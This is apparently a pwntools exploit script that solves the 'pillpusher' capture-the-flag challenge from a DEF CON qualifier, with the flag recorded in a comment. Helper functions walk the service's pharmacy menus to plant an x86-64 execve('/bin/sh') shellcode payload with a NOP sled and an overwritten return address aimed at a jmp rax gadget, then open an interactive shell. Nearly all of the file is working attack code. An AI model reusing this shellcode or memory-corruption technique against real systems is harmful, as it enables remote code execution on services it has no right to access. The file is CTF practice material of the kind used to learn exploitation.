#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.23"
#port = 8888

# The flag is: Those DFs are interesting creatures.
host = "pillpusher_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me"
port = 43868

r = remote(host,port)

def create_pharmacy(name,pillname,pillname2,pillname3,staff):
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(pillname)
    r.recvuntil(":")
    r.sendline(pillname2)
    r.recvuntil(":")
    r.sendline(pillname3)
    r.recvuntil(":")
    r.sendline("")
    r.recvuntil(":")
    r.sendline(staff)
    r.sendline("")
    r.recvuntil("->")
    r.sendline("5")


def create_pill(name,dosage,sche,treat,inte,side):
    r.recvuntil("->")
    r.sendline("2")
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(dosage)
    r.recvuntil(":")
    r.sendline(sche)
    r.recvuntil(":")
    r.sendline(treat)
    r.recvuntil(":")
    r.sendline("")
    r.recvuntil(":")
    r.sendline(inte)
    r.recvuntil(":")
    r.sendline("")
    r.recvuntil(":")
    r.sendline(side)
    r.recvuntil(":")
    r.sendline("")
    r.recvuntil("->")
    r.sendline("6")

def create_pharmacist(name,level):
    r.recvuntil("->")
    r.sendline("3")
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(level))
    r.recvuntil("->")
    r.sendline("5")

def create_patient(name,symptoms):
    r.recvuntil("->")
    r.sendline("4")
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline("y")
    r.recvuntil(":")
    r.sendline(symptoms)
    r.sendline("")
    r.recvuntil("->")
    r.sendline("5")

def scrip(pharmacy,pharmacistidx,patient):
    r.recvuntil("->")
    r.sendline("5")
    r.recvuntil("->")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(pharmacy)
    r.recvuntil("->")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(pharmacistidx))
    r.recvuntil("->")
    r.sendline("3") 
    r.recvuntil(":")
    r.sendline(patient)

payload = "\x90"*0x10 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = payload.ljust(0x80,"\x90")

jmp_rax = 0x0000000000403a18
rip = jmp_rax
create_pill(payload,"100","33","cc","dd","ee")
create_pill("t" + p64(rip),"100","33","cc","dd","ee")
create_pill("d"*9,"100","33","cc","dd","ee")
create_pharmacist("meh",100)
create_pharmacy("orange",payload,"d"*9, "t" + p64(rip),"meh")
create_patient("fuck","cc")

scrip("orange",1,"fuck")

r.recvuntil("->")
r.sendline("4")
r.recvuntil(":")
r.sendline("-1")
r.recvuntil(":")
r.sendline(payload)
r.recvuntil(":")
r.sendline(payload)
r.recvuntil(":")
r.sendline(payload)
r.recvuntil(":")
r.sendline(payload)
r.recvuntil(":")
r.sendline("d"*9)
r.recvuntil(":")
r.sendline("t" + p64(rip))
r.sendline("")

r.interactive()

